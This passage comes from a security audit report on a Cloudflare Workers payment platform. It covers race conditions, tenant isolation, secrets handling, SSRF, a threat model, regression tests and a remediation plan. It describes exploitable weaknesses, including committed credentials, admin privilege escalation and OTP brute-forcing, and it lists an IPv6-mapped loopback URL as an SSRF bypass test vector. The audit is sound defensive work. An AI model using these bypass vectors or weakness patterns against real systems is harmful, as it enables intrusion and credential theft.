| KV outage | domain cache misses → D1 fallback; bootstrap check fails gracefully | degraded latency | none | code paths tolerate | ✅ smoke |

---

# 20. Concurrency & Failure Analysis

## 20.1 The classic interleavings, re-run against v0.3.0

**balance=100, withdraw 80 & 80 (refund-speak: refund 60 & 60 of a 100 capture):**
sequential — second rejected (bound). Concurrent — **both pass** (NEW-P2-001): SELECT-SUM / check / INSERT are three separate statements across two isolates. D1's SQLite engine serializes individual writes, not the read-check-write transaction. Financial risk: over-refund bounded by (sum of concurrent refunds − captured). Fix in §10.3.

**same idempotency key, two simultaneous requests:** both execute (P1-001); both 201; ledger dedups the *posting* (same `m{m}:payment:{intent}`? No — two intents!). Wait — createIntent generates a new intent per call → **two distinct payments** for one key+body. The economic effect duplicates at the *intent* level, and only the ledger-level dedup of the *completion* (per intent) protects — but these are two different intents, so both complete if both are paid. Verdict: **the replay cache prevents sequential retries, not concurrent ones.** Fix: reservation (§13.7.1).

**complete X & complete X (webhook + SMS race):** converge — ledger tx_id dedup + guarded writes. ✅ (test-verified "webhook + SMS double-completion converges").

**refund X & refund X (same key):** idempotency required on the route → sequential replay returns cached; concurrent → double creation (same as above), but the *workflow* instance id is `refund-{rowId}` per row, so two rows → two refunds → bound check raced. Same root cause family.

## 20.2 await-inside-critical-sections audit (brief §14)

`LedgerDO.postInner` awaits two D1 hops inside `blockConcurrencyWhile` — **by design and correct**: the input gate holds, so no concurrent posting interleaves; the DO never throws across the boundary. Refund workflow steps await D1/queues inside `step.do` — durable, replay-safe. The dangerous awaits are outside any serialization: refund.ts bound-check→insert, idempotency insert (post-response), mobile pairing check→insert.

## 20.3 Retry-storm and stuck-state analysis

- Webhook consumer: bounded 3 retries with 60/300/1800s backoff → no storm. DLQ present.
- Refund workflow: 52 polls max, exponential to 30m cap → ~24h then DLQ (errored instance) + page. No infinite loop.
- Reconciliation sweep: daily, idempotent instance id per day. Fast-heal cron hourly replays pending postings — bounded by pending count.
- Stuck states possible today: payment rows stuck 'processing' with ledger posted (P1-006); refund rows stuck 'pending' after instance errored (alarm + manual); SMS rows 'needs_manual_review' (operator queue by design).

---

# 21. Multi-Tenant Isolation

## 21.1 Query-predicate audit (all SQL touching tenant data)

Reviewed every `.prepare(` in controllers/services/queues: merchant-scoped predicates are present on payments, transactions, refunds, webhooks, deliveries, gateways, api-keys, ledger accounts/entries, sms data, notifications (read path), domains, customers. Exceptions found:

1. `admin-api.ts` GET/POST `/merchants` — **intentionally global, missing the platform gate** (P1-005).
2. `webhooks.ts:70-84` — master-domain fallback binds to platform merchant (P2-004).
3. `mobile.ts:250-262` — notification ack by bare id (P3-003).
4. `refund-reconciliation.ts` `queryGatewayRefundStatus` — gateway slug lookup by transaction id without merchant predicate (internal data, low risk).
5. `LedgerDO` — no self-identity check (P2-012).

## 21.2 Cross-tenant test evidence

tenant-routing tests cover API-key and JWT mismatch 403s (host-bound), master-domain bypass semantics, and checkout token scoping. Not covered: object-level cross-tenant access within admin routes (P1-005 is the hole), notification ack (P3-003).

## 21.3 The domain↔key binding

`requireBearerApiAuth` enforces `domainMerchantId === keyRow.merchant_id` when the domain middleware resolved a merchant (auth.ts:104-108) — good. The master domain (`APP_DOMAIN`) intentionally bypasses (admin territory) — documented and tested.

---

# 22. Authentication & Authorization

## 22.1 API keys

Format `op_live_<12><rest>`; prefix index lookup + SHA-256 hash + `timingSafeEqual` (auth.ts:44-90); expiry + merchant status checks; scopes from DB JSON; last_used_at via waitUntil. **Prefix non-unique (P2-013).** Hash comparison timing-safe. Key creation routes: install (once), bootstrap-key (credential exchange), admin provisioning (P1-005 carrier), api-keys (admin scope) — the issuance surface is broader than ideal.

## 22.2 JWTs (mobile)

HS256 via `jose`; issuer/audience/expiry validated (jwt.ts); refresh tokens 30d; device_id in payload but **not** used as authSubject (P3-002). Secret = the committed JWT_SECRET (P0-001) — rotate.

## 22.3 Cloudflare Access (admin)

JWKS-verified ES256/RS256 with raw↔DER tolerance (both encodings accepted — same mathematical signature, standard JOSE practice, not a malleability risk); iss/aud/exp fail-closed; kid-aware with one cache refresh; JWKS cached 5min; fail-closed 503 on JWKS outage; break-glass alarmed. **Residuals:** bearer pass-through preserves P1-005; `===` comparisons (P2-011); no JWKS fetch timeout (P2-011). Test coverage: access-jwt.test.ts is exemplary (tamper, wrong aud, expired, wrong team, unknown kid).

## 22.4 Fail-closed posture

AuthN/AuthZ fail closed everywhere except: rate-limit binding absence (documented open), webhook geo layer (open when cf.country missing — signature is the gate), ENABLED_GATEWAYS unset (open — all adapters). The bootstrap "not configured" path requires a bearer header or 401s — closed.

---

# 23. Webhook / Gateway Security

## 23.1 Inbound (provider → platform)

Order (as implemented): gateway enabled check (404) → merchant resolution → **IP allowlist (data-driven) → geo fallback → raw body read → signature verify (HMAC, raw body) → parse → event dedup (UNIQUE) → completion via idempotent path.** Deviation from the brief's canonical order: body-size limit is absent between merchant resolution and raw-body acquisition (P1-003). Event-id fallback random (P1-003). Signature always required — the load-bearing control. Provider event IDs preferred when present; body-hash is not used as identity.

## 23.2 Outbound (platform → merchant)

HMAC-SHA256 over payload + timestamp headers; 15s timeout; 3 retries 60/300/1800s; DLQ. **SSRF catalogue per 6.4; no idempotency key; retry classification wrong for 4xx (P3-009); payload_hash 'system' (P3-008).** URL registration now needs... no write scope (P1-008) — registration is the SSRF entry point, so this compounds.

## 23.3 Gateway adapters

`gwFetch` enforces timeouts (15s default) with AbortController, redacts URLs in errors (query dropped), clips error text (512) — good hygiene. Credentials decrypted per-call from D1 (AES-GCM) and never logged. Unknown/disabled gateways: 404 fail-closed, indistinguishable (good). Gateway selection: platform ceiling via ENABLED_GATEWAYS (fail-open when unset, P2-16), per-merchant config in op_gateways/op_gateway_configs. Timeout semantics: `GwTimeoutError` classified as failed (not completed) — for execute-style verify calls this maps to "not completed at provider" which bKash/SSLCommerz treat as queryable; acceptable, documented in kit/http.ts.

---

# 24. Cryptography & Secrets

| Control | Implementation | Verdict |
|---|---|---|
| AES-256-GCM | 12-byte fresh IV, 128-bit tag, envelope `iv‖ct‖tag` base64 | correct |
| key | single ENCRYPTION_KEY, **committed in archive** (P0-001), no versioning (P2-010) | FAIL posture |
| HMAC-SHA256 | webhook signing + verify timing-safe | correct |
| JWT | HS256 pinned (jose), issuer/aud/exp | correct; secret committed |
| PBKDF2 | 50K default / 10K floor / 2M cap (P2-017; comment says 600K) | weak-but-bounded |
| CSPRNG | `crypto.getRandomValues` everywhere (randomBytes, randomUUID, randomNumericOtp); no Math.random in src | correct |
| timing-safe | timingSafeEqual for key hash + HMAC verify; **break-glass uses ===** (P2-011) | mostly |
| secret storage | wrangler secrets for the three keys; **KV plaintext root key** (NEW-P1-001); gateway creds encrypted in D1 | mixed |
| git hygiene | `.dev.vars` committed in archive; verify scripts carry literal fallbacks (P0-001); no CI scanner | FAIL |

---

# 25. SSRF / XSS / Injection / CSRF / Rate Limiting

**SSRF:** outbound webhook filter bypass catalogue (6.4) — the primary live vector; sms-phone-mockup open proxy (P3-006) is the dev-only secondary; gateway adapter URLs are constants (safe); custom-hostnames fetch targets api.cloudflare.com (safe, un-timed); cron exchange-rate fetch un-timed (P2-020).

**XSS/Injection:** checkout template fully escaped in-context + CSP (5.6); maintenance reason raw (P3-005); SQL: 100% parameterized (`.bind`); no `eval`/`Function`; `new RegExp` on merchant patterns (P2-015) is the injection-adjacent surface (ReDoS).

**CSRF:** no cookie-based auth anywhere (bearer/JWT/Access); CORS fail-closed allowlist with `credentials: false`; CSRF middleware dead code (P2-001) — delete or wire, but exposure is theoretical.

**Rate limiting:** native per-key bindings (real improvement); per-IP KV groups mounted for install only; dead groups otp/password (NEW-P1-002); KV counter race; install 120/min vs comment 3/hour; binding-absent fail-open on writes (P2-005).

---

# 26. Queues, Workflows, Cron

| Aspect | webhook-out | email-out | sms-parse | refund workflow | sweep workflow |
|---|---|---|---|---|---|
| producer | WebhookDispatcher (completeTransaction, finalize) | services | mobile routes | RefundService (instance per refund) | daily trigger + admin |
| payload | {merchant_id, event, payload, url, secret, attempt} | email | {merchant_id, sender, body...} | {refund_id} | {date} |
| idempotency | none ⚠ (P1-004 comp.) | n/a | row insert + status | instance id `refund-{id}`; sweep `refund-{id}-sweep-{n}` | instance per UTC day |
| retries | 3 (60/300/1800s) | 5 | 3 | step retries 3; poll 52×~24h | step retries |
| DLQ | webhook-out-dlq | email-out-dlq | sms-parse-dlq | errored instance + page | errored instance |
| duplicate delivery | re-POST (merchant-side dup) | dup email | re-parse (statuses idempotent-ish) | no-op (status guards) | no-op |
| observability | op_webhook_deliveries rows | logs | metrics (inert P2-006) | pages + instance dashboard | op_reconciliation_runs |

**Overall verdict:** the async fabric is coherent and bounded; the two structural gaps are outbound-webhook idempotency and the missing delivery outbox (P2-007).

---

# 27. Observability

Can operations answer the brief's questions? Partially:

| Question | Answerable? | Where |
|---|---|---|
| Where is transaction X? | yes | op_transactions + intents (status, trx ids) |
| Did money move? | yes | op_ledger_postings + DO journal + audit mirror |
| Did the gateway respond? | yes | adapter logs (clipped), tx status; **gateway raw responses not persisted** |
| What provider ID did we receive? | yes | gateway_trx_id on tx / refund |
| Was the ledger posted? | yes | postings row status + DO |
| Was the webhook processed? | inbound: op_webhook_events; outbound: op_webhook_deliveries | yes |
| Was the event replayed? | inbound yes (dedup hit); outbound no (no idempotency key) | mixed |
| Why is the payment pending? | partially | metadata customer_trx_id + sms match_status; no explicit "waiting on what" field |
| Was reconciliation attempted? | yes | op_reconciliation_runs + pages |

Structured logging exists (requestId first, JSON logs, error envelopes); `page()` alarm path exists (console fallback works). **The ANALYTICS binding is commented out, so all metrics are no-ops** (P2-006) — enabling it is a one-line un-comment + dashboard step that should be mandatory in the deploy runbook. Secrets are not logged (adapter errors redacted, clipped) — verified.

---

# 28. STRIDE Threat Model (condensed per component)

| Component | Spoofing | Tampering | Repudiation | Info Disclosure | DoS | Elevation |
|---|---|---|---|---|---|---|
| checkout (customer) | token guess (unguessable) | amount tamper — closed (P0-004/P0-007) | audit trail ok | brand fields escaped | unthrottled verify (NEW-P2-005) | none (no creds) |
| merchant API | key theft (committed! P0-001) | read-key mutations (P1-008) | last_used_at only | PII customers route | per-key RL ok | scope gaps P1-008 |
| admin API | **any admin key = platform (P1-005)** | provisioning tamper | break-glass alarmed | **root-key harvest in response** | RL ok | **P1-005 core issue** |
| mobile | **OTP brute (P1-002)** | SMS injection bounded by corroboration | JWT sub/dev confusion (P3-002) | merchant SMS content to paired device | unthrottled pair | P3-003 ack |
| webhooks inbound | signature required ✅ | replay → dedup (id-dependent P1-003) | events logged | 404-probing uniform | **no size cap (P1-003)** | none |
| webhooks outbound | — | **SSRF (P1-004)** | deliveries logged | response bodies not stored | bounded | none |
| ledger/DO | binding-only access | balanced+guarded ✅ | audit mirror ✅ | per-tenant DO ✅ | single-writer (per-tenant ok) | P2-012 self-check |
| refunds | key + write scope | **bound race (NEW-P2-001)** | workflow steps logged | — | bounded polls | — |
| bootstrap/install | **bootstrap-key oracle (NEW-P1-002)** | KV-only lock | page() on anomalies | **KV root key (NEW-P1-001)** | install 120/min | prod defaults closed ✅ |
| gateways | creds encrypted ✅ | adapter constants | gwFetch redaction ✅ | clipped errors | 15s timeouts ✅ | ENABLED_GATEWAYS unset=open |

Payment-specific STRIDE: double-spend ✅ closed; replay ✅ (ledger) / ⚠ (webhook no-id); races ⚠ (refund bound, idempotency); amount manipulation ✅ closed; merchant substitution ✅ (domain-key binding); TrxID substitution ✅ closed (P0-007) / ⚠ callback-conditional (NEW-P2-003); refund duplication ⚠ race; gateway substitution ✅ platform ceiling; ledger corruption ✅ protocol; reconciliation abuse — admin-scope only, P1-005 carrier; credential theft — **open (P0-001)**; privilege escalation — **open (P1-005, P1-008)**.

---

# PART VI — DELIVERABLES & VERDICT

---

# 29. Required Regression Tests (Gaps)

Tests that must exist before the next release, mapped to the findings they pin:

| # | Test (file → case) | Pins | Priority |
|---|---|---|---|
| 1 | payment-integrity: two **concurrent** same-key POST /payments → exactly one intent created (assert row count, not just no-500) | P1-001 | P0-gate |
| 2 | payment-integrity: concurrent partial refunds summing > captured → over-refund impossible | NEW-P2-001 | P0-gate |
| 3 | payment-integrity: POST /payments with read-only key → 403 | P1-008 | P0-gate |
| 4 | api-middleware: POST/DELETE /webhooks with read-only key → 403 | P1-008 | P0-gate |
| 5 | tenant-routing: non-platform admin key → GET/POST /api/admin/v1/merchants → 403 | P1-005 | P0-gate |
| 6 | payment-edgecases: `amount: "99999999999.99"` → 400 (ceiling) | P2-018/NEW-P3-004 | high |
| 7 | gateway mock: handleCallback with verifyResult.amount "100.001" vs intent "100.00" → rejected (float tolerance exposed) | NEW-P2-002 | high |
| 8 | gateway mock: verifyResult.amount = null → completion must NOT complete (API gateways) | NEW-P2-003 | high |
| 9 | smoke: 6th pair attempt within hour → 429 (after mounting 'otp' group) | P1-002/NEW-P1-002 | high |
| 10 | api-middleware: webhook ingress with 200KB body → 413 (after size cap) | P1-003 | high |
| 11 | webhook-consumer (unit): isAllowedWebhookUrl('https://[::ffff:127.0.0.1]/') → false (after SSRF fix; table-test all vectors from 6.4) | P1-004 | high |
| 12 | ledger-consistency: platform merchant included in verifyAllMerchants | P2-003 | medium |
| 13 | mobile: notification ack with foreign ids → 0 rows | P3-003 | medium |
| 14 | mobile: heartbeat updates own device row (authSubject = device_id) | P3-002 | medium |
| 15 | runtime-integrity: after bootstrap, KV has NO system:root_api_key | NEW-P1-001 | high |
| 16 | api-middleware: idempotency same key on two endpoints → 409 or scoped | P1-001 | medium |
| 17 | install: D1-backed install lock survives KV clear | P0-005 residual | medium |

The suite's existing strength (ledger crash-injection, corroboration edge cases, Access JWT tamper matrix) means these additions slot into established patterns — 1, 2, 5 in particular extend harnesses that already exist.

---

# 30. Remediation Roadmap

## Phase A — "Perimeter Saturday" (1-2 days, no architecture changes) — *precondition for ANY production traffic*

| # | Action | Closes | Effort |
|---|---|---|---|
| A1 | Rotate JWT_SECRET, APP_KEY, ENCRYPTION_KEY, live API key; purge literals from verify-*.mjs and .dev.vars; re-encrypt gateway credentials; add gitleaks CI | P0-001 | 2-4h (ops) |
| A2 | Delete KV `system:root_api_key` write + purge existing KV values | NEW-P1-001 | 15min |
| A3 | Mount `perIpRateLimit('password')` on /install/bootstrap-key; `('otp')` on /api/mobile/v1/pair*; add per-token attempt counters | P1-002, NEW-P1-002 | 1h |
| A4 | Platform gate: `requireScope('platform')` + `is_platform` check on /api/admin/v1/merchants*; stop returning raw credentials in provisioning | P1-005, NEW-P2-004 | 2h |
| A5 | `requireScope('write')` on POST /payments, POST/DELETE /webhooks | P1-008 | 30min |
| A6 | SSRF: `redirect: 'error'` + IP canonicalization (integer/hex/octal/IPv6-mapped/ULA) + 4xx terminal classification + idempotency key header | P1-004, P3-009 | 4-6h |
| A7 | Body-size caps (128KB) on /webhook/*, /api/* JSON, mobile batch | P1-003, P2-014 | 1h |
| A8 | Amount ceiling `.refine` + `cmp()` in handleCallback + unconditional amount requirement for API-gateway completion | P2-018, NEW-P2-002/003 | 1h |
| A9 | Refund bound race: conditional-INSERT form (NEW-P2-004 §10.3 option 1) | NEW-P2-001 | 2h |
| A10 | eslint.config.js (flat) + lint in CI | P1-009 | 30min |
| A11 | Enable ANALYTICS binding (uncomment + dashboard) | P2-006 | 15min |
| A12 | Idempotency reservation (status+lease column, pre-insert) | P1-001 | 3h |

## Phase B — Hardening week (next sprint)

- Encrypt-then-test webhook event-id fallback → `sha256(gateway+body)`; size caps enforced via WAF rules too (P1-003).
- Outbox for merchant webhooks (op_webhook_outbox + cron drain) (P2-007).
- Payment-row healing in the sweep workflow (ledger-posted → completed repair, guarded) (P1-006).
- Guard completeTransaction status writes (`WHERE status NOT IN ('expired','failed')`) (P1-006).
- DO self-check `payload.merchant_id` (P2-012); `UNIQUE(key_prefix)` (P2-013); ordinal in mirror dedup (P2-008); break-glass timing-safe + JWKS timeout (P2-011); ENCRYPTION_KEY versioning + rotation runbook (P2-009/010); decrypt-failure alarms (P2-009); platform merchant in consistency verify (P2-003); currency exponents table (P2-019); exchange-rate sanity + timeout (P2-020); SMS regex validation (P2-015); mobile authSubject/device fix (P3-002) + ack predicate (P3-003); maintenance escapeHtml (P3-005); mockup proxy lock-down (P3-006); payload_hash (P3-008); install lock in D1 (P0-005); createIntent D1 batch (P1-007).
- All 17 regression tests from §29.

## Phase C — The four-worker split (per §13; 2-3 weeks)

Phases 0-5 as specified. Carry the §13.7 fix-set into the move. Ship the reduced REST contract (§14) with the merchant worker.

## Sequencing rationale

Phase A is deliberately "boring": every item is a small patch to the current monolith, deployable in one release, and each maps 1:1 to a disqualifying finding. Phase C without Phase A would ship a well-isolated architecture containing the same un-rotated secrets and the same escalation — isolation is not remediation. Phase A without Phase C is a legitimately deployable controlled-production state for a small merchant count; Phase C is what makes scale (and multi-tenant trust) structurally safe.

---

# 31. Final Architecture Scorecard

| Area | Verdict | Evidence | Main risk |
|---|---|---|---|
| Architecture | **PASS WITH CONDITIONS** | coherent monolith, strong subsystem boundaries; 4-worker claim unimplemented | blast radius (single isolate holds all bindings) |
| Routing | PASS | middleware order sane; run_worker_first asset handling correct | SPA/catch-alls absent (nothing shadowed) |
| Authentication | **CONDITIONAL** | key hash timing-safe; Access JWKS verified fail-closed | committed secrets (P0-001); OTP brute (P1-002) |
| Authorization | **FAIL** | scope machinery exists | read-key mutations (P1-008); platform escalation (P1-005) |
| Tenant Isolation | **CONDITIONAL** | predicates + tests | P1-005, P3-003, P2-004 |
| Ledger Integrity | **PASS** | posting protocol + crash tests | mirror ordinal (P2-008) |
| Payment State Machine | **CONDITIONAL** | single completion funnel + guards | unguarded completion; no row healing (P1-006) |
| Concurrency | **CONDITIONAL** | DO serialization excellent | refund bound race; idempotency reservation absent |
| Idempotency | **CONDITIONAL** | scoping/409/4xx rules | concurrent double-execution (P1-001) |
| Data Model | **CONDITIONAL** | 0001-0004 solid, idempotency UNIQUE | key_prefix, refund bound not DB-enforced |
| Migrations | PASS | additive, idempotent, indexed | none material |
| Webhooks (inbound) | **CONDITIONAL** | layered + signed + dedup'd | size cap, random event ids (P1-003) |
| Webhooks (outbound) | **FAIL** | timeout/retries/DLQ ok | SSRF catalogue; no idempotency key (P1-004) |
| Gateways | PASS | kit timeouts, redaction, fail-closed 404 | ENABLED_GATEWAYS unset=open |
| Cryptography | **CONDITIONAL** | AES-GCM/HMAC/CSPRNG correct | single versionless key; committed; PBKDF2 50K |
| Secrets | **FAIL** | wrangler secrets used | committed set; KV root key; no scanner |
| SSRF | **FAIL** | gateway URLs constant | webhook filter bypass catalogue (P1-004) |
| XSS/Injection | **PASS** | full-context escaping + CSP | unsafe-inline; maintenance reason |
| CSRF | PASS (n/a) | no cookie auth; CORS closed | dead middleware (delete) |
| Rate Limiting | **CONDITIONAL** | native per-key bindings | dead groups; install 120/min |
| Queues/Workflows | PASS | bounded, DLQ'd, idempotent | delivery idempotency; outbox |
| Reconciliation | PASS | replay + verify + drift pages | payment rows not healed; platform merchant excluded |
| Observability | **CONDITIONAL** | logs/pages/tables | ANALYTICS disabled — metrics inert |
| Deployment Safety | **CONDITIONAL** | 3 configs, dry-run clean | secrets in repo; lint broken |

---

# 32. The 17 Executive Questions (brief §46)

```text
1.  Can the system accidentally create money?
    No. Every posting is shape-validated, balanced, bounded, and deduped
    (LedgerDO A/B/C). Completion sources all post through one idempotent
    entry point.

2.  Can the system accidentally destroy money?
    No — same invariant set. (Refund over-issuance is bounded abuse, not
    destruction; see 3.)

3.  Can the same economic transaction execute twice?
    Sequentially: no (tx_id dedup + idempotency cache + TRX_ALREADY_USED).
    Concurrently: YES in two windows — same-idempotency-key concurrent
    payment creation, and raced partial refunds exceeding the captured
    amount (P1-001, NEW-P2-001). Both have small patches (§10.3, §13.7).

4.  Can two concurrent transactions overspend the same balance?
    Ledger: no (DO single-writer + balance guard). Refund bound: yes
    (NEW-P2-001). Checkout double-pay of one intent: converges (dedup).

5.  Can Merchant A access or mutate Merchant B's data?
    Via normal API surfaces: no (tested). Via admin escalation: YES —
    any admin-scoped key provisions tenants and harvests their root keys
    (P1-005). Notification acks also cross tenants (P3-003).

6.  Can a compromised frontend worker reach privileged core functionality?
    Today there is no frontend worker (monolith) — the checkout code
    itself runs with D1/KV/DO credentials attached, which is the
    problem the §13 split fixes. Post-split: only via the binding with
    per-worker HMAC + core-side re-authorization.

7.  Can webhook replay create another financial effect?
    Inbound: no when the provider supplies event ids (UNIQUE dedup) and
    the completion funnel dedups regardless. Without provider ids, the
    event re-processes but the financial effect still dedups; metrics
    double-count (P1-003).

8.  Can an external gateway timeout produce an incorrect financial state?
    Timeout → adapter returns failed → tx marked failed (guarded). A
    "timed out but actually succeeded" gateway outcome leaves the tx
    failed while money moved at the provider — recoverable only via the
    SMS path or manual reconciliation (no gateway-side status sweep for
    payments; refunds DO have a poll loop). Medium residual.

9.  Can D1/DO/Queue partial failure leave unrecoverable inconsistency?
    Ledger: no — the posting protocol + reconciliation converge every
    seam (crash-injection tested). Payment ROWS: yes — completed-ledger
    but 'processing'-row states have no healer (P1-006). Merchant
    webhooks: lost on a crash window (P2-007).

10. Can every partially completed payment eventually converge?
    Ledger side: yes (hourly fast-heal + daily sweep). Row/status side:
    no (P1-006). Refunds: yes (workflow + sweep + DLQ page).

11. Are authentication and authorization fail-closed?
    AuthN: yes (keys, JWT, Access all fail closed). AuthZ: fail-closed
    in mechanism, but the policy has holes (P1-005, P1-008) — a closed
    gate on the wrong policy.

12. Are production secrets and bootstrap credentials safe?
    No. The committed set is un-rotated (P0-001); a plaintext root key
    sits in KV (NEW-P1-001); bootstrap-key is a weakly throttled oracle
    (NEW-P1-002).

13. Biggest unresolved FINANCIAL risk?
    The refund-bound concurrency race (NEW-P2-001), with the conditional
    callback amount check (NEW-P2-003) as the runner-up.

14. Biggest unresolved SECURITY risk?
    The committed, un-rotated credential set (P0-001) — full platform
    compromise is available to every archive holder.

15. Biggest unresolved OPERATIONAL risk?
    Metrics are entirely inert (ANALYTICS disabled, P2-006) while the
    system's alarms (drift, REFUND_STUCK, rate-limit degradation) are
    metrics-based — production would run blind on exactly the signals
    the design depends on.

16. What must be fixed before production?
    The Phase A list (§30): rotation/purge, KV root key, limiter
    mounting, platform gate, write-scope gaps, SSRF guard, size caps,
    amount ceiling/strictness, refund race, lint+scanner, ANALYTICS on.

17. What should be improved before scale?
    The Phase B list (healing, outbox, key versioning, exponents,
    idempotency reservation) and the Phase C four-worker split (§13)
    with the reduced customer-facing REST surface (§14).
```

---

# 33. Final Production Verdict

```text
NOT PRODUCTION READY
```

**Grounds (any one is disqualifying; three are present):**

1. **Secret compromise (EDGE-P0-001, partial):** live platform key + JWT secret + ENCRYPTION_KEY committed in the shipped archive, un-rotated. Anyone who has obtained this zip can administer the deployed platform and decrypt stored gateway credentials.
2. **Privilege escalation (EDGE-P1-005, unfixed):** any merchant admin-scoped key can enumerate all tenants and mint new ones, receiving their root API keys, pairing OTPs, and webhook secrets.
3. **Plaintext root credential + unthrottled credential oracles (NEW-P1-001/002):** a `'*'`-scoped key at rest in KV and two anonymous guessing surfaces with dead rate-limit configuration.

**What stands between this repository and PRODUCTION READY WITH CONDITIONS is small and precisely bounded:** the Phase A list — an estimated 1-2 engineer-days of patches plus a rotation operation. The financial core that disqualify the *previous* version — refund ID-space confusion, unbounded refunds, callback substitution, SMS null-amount bypass, checkout XSS — are all **fixed, tested, and well-engineered** in v0.3.0. The 212-test suite with real-workerd crash injection, the posting protocol's write-ahead/replay convergence, and the strict corroboration gate are genuine, verifiable engineering.

**Recommended path:** execute Phase A immediately; re-run this audit's §29 regression battery plus the §5-8 verification matrix (one day of audit work); then deploy into controlled production (single-tenant or low-tenant-count) under the conditions of §2.3. Schedule Phase B within the first sprint and Phase C (the four-worker split with Worker RPC and the reduced customer-facing REST surface, per §13-15) before opening multi-tenant self-service onboarding.

**On the architecture questions specifically:**

- **Multi-worker frontend system:** implement exactly per §13 — customer / merchant / admin frontend workers holding no data-plane bindings, one core worker owning D1/KV/R2/DO/queues/workflows, phased route-flip migration, reversible at every step.
- **API reduction:** per §14 — a 13-route merchant-facing REST contract plus token-bound checkout routes and the provider webhook ingress; everything operational moves behind the admin worker or RPC.
- **Cloudflare Service Bindings / Worker RPC:** appropriate and recommended (§15) — typed shared-interface RPC for operations, fetch-through-binding for payload-shaped calls, per-worker HMAC caller authentication with core-side re-authorization, interface versioning for deploy skew. Compared against five alternatives it is the only option that simultaneously delivers network isolation, type safety, near-zero latency, no per-call billing, and deploy independence; its one real cost is the 2-3 week migration, which the phased plan caps.

The system that v0.3.0's authors built under the ledger is worth protecting. The perimeter work in Phase A and the decomposition in Phase C are how it earns the right to hold other people's money.

---

*Audit performed 2026-09-01/02 against `edgepay-cf-clean-new.zip` (v0.3.0, single commit `6c31bad`). All file:line references are to that archive. Previous-audit references are to `EDGEPAY_CF_FULL_AUDIT_REPORT.md` as shipped inside the same archive. No secret values were operationalized during this audit; the credential literals observed are quoted only as evidence of their presence and remain redacted-by-policy in operational contexts.*

# ANNEX A — REQUIRED P0 FILE DEEP REVIEWS (brief §43)

Per the audit brief, each of the seven highest-priority files receives a structured report: responsibility, assets, threats, trust boundaries, protections, invariants, concurrency risks, failure modes, tenant-isolation risks, tests, missing tests, improvements, verdict.

---

## A.1 `src/index.ts` (295 lines)

**Primary responsibility.** Application entrypoint: global middleware stack (requestId → logger → bootstrap-check → domain → maintenance → prettyJSON(dev) → secureHeaders → CORS → securityHeaders(api/webhook) → Access gate(admin) → install limiter), route mounts (install, /api/v1, mobile, admin, api-reference, checkout×3, webhook, assets, health), worker exports (fetch/queue/scheduled), DO + Workflow class re-exports.

**Critical assets.** The middleware ORDER itself (authorization position), the admin Access gate mount, the install rate-limit mount, the auto-bootstrap hook.

**Threats.** Route shadowing (none — single catch-all-free design, assets delegated with run_worker_first); middleware order bypass (bootstrap runs before auth — by design, KV-gated); Access gate circumvention (bearer path — A.5); unmounted middlewares (CSRF, otp/password limiters) implying protection that does not exist.

**Trust boundaries.** Internet→Worker at fetch(); per-mount auth boundaries at /api/*, /api/admin/*, /webhook/*, /install/*.

**Existing protections.** requestId-first logging; dev-only prettyJSON; fail-closed CORS allowlist; OWASP headers; Access JWT verification; per-key native rate limiting mounted inside controllers.

**Critical invariants.** Every admin route passes accessAuthMiddleware; every /api/v1 route passes requireBearerApiAuth; bootstrap never runs on /install paths (wizard owns those).

**Concurrency risks.** `bootstrapPromise` dedup is module-scope per isolate — concurrent cold-start isolates can each run ensureSystemBootstrapped (idempotent by existing-row checks; race on op_merchants insert guarded by uuid re-select — acceptable).

**Failure modes.** Bootstrap failure: caught + warned; requests proceed unbootstrapped (KV flags absent → retried next request). Queue handler awaits (correct for at-least-once semantics).

**Tenant-isolation risks.** domainMiddleware before auth (correct — resolves tenant for cross-checking); master-domain semantics.

**Relevant tests.** smoke.test.ts (boot, health, 404/401 envelope, OPTIONS), api-middleware.test.ts (CORS/headers).

**Missing tests.** Assert OTP pair route 429 after N attempts (after A3 fix); assert admin bearer escalation blocked (after A4 fix).

**Recommended improvements.** Delete CSRF dead code and dead limiter groups or mount them; move the install comment (3/hour) to match reality; in the Phase C split this file dissolves into four small indexes.

**Verdict.** PASS WITH CONDITIONS — wiring hygiene issues only.

---

## A.2 `src/services/payment.ts` (437 lines)

**Primary responsibility.** Payment lifecycle: createIntent, initiatePayment, handleCallback, completeTransaction — the funnel through which every completion flows.

**Critical assets.** The completion funnel (money-moment), amount/intent binding at callbacks, ledger-before-completion ordering.

**Threats.** Callback substitution (closed when adapter echoes amount — NEW-P2-003 residual), amount float comparison (NEW-P2-002), status-write races (P1-006), createIntent partial failure (P1-007).

**Trust boundaries.** Receives already-domain-resolved + token-bound requests from controllers; calls adapters (outbound) with decrypted credentials; posts to LedgerDO.

**Existing protections.** Amount equality + trx_id binding (conditional); guarded failed-writes; ledger awaited FIRST; D1 batch for tx+intent completion; zod at the API entry.

**Critical invariants.** (1) No completion without a ledger posting. (2) Posting idempotent per intent. (3) No completion of a failed/other-tenant intent (token binding). (4) Amount bound to the DB amount for SMS/webhook paths, provider amount for callbacks (conditional).

**Concurrency risks.** completeTransaction double-invocation converges (ledger dedup); the status batch is unguarded (expired→completed possible); createIntent intent/tx insert not batched.

**Failure modes.** Ledger failure → 500 before claiming completion (good — recoverable pending row exists); webhook dispatch failure post-completion → webhook lost (P2-007).

**Tenant-isolation risks.** handleCallback intent lookup by token only (NEW-P2-006 — add merchant predicate as defense-in-depth).

**Relevant tests.** payment-integrity (posting-before-completion + pending recovery), payment-edgecases (formats).

**Missing tests.** Callback amount mismatch via adapter mock; concurrent same-key creation economic-effect assertion; ceiling rejection.

**Recommended improvements.** §10.4/10.5/10.6/10.12 of Part III; add `getCheckoutView`-style read method for the customer-worker split (§13).

**Verdict.** PASS WITH CONDITIONS — the funnel design is right; the binding checks need strictness.

---

## A.3 `src/do/ledger-do.ts` (564 lines)

**Primary responsibility.** The per-tenant single-writer ledger: posting protocol (A-F), balance guards, dedup, snapshots, structured failure returns.

**Critical assets.** The book. Every financial invariant lands here.

**Threats.** Input-gate breakage (a throw across blockConcurrencyWhile — guarded by the never-throw design + structured results), fault seam abuse (guarded by magic env, P2-002), cross-tenant payload confusion (P2-012), poison replay (rejected-status guard — handled).

**Trust boundaries.** Binding-only access (no HTTP); internal RPC from LedgerService.

**Existing protections.** Shape validation; tx_id dedup; normal-side balance guard; write-ahead D1; idempotent audit batch; constructor table bootstrap under blockConcurrencyWhile; alarm-based snapshots.

**Critical invariants.** Balanced postings only; exactly-once per tx_id; balances never negative on normal side; D1 mirror converges after replay.

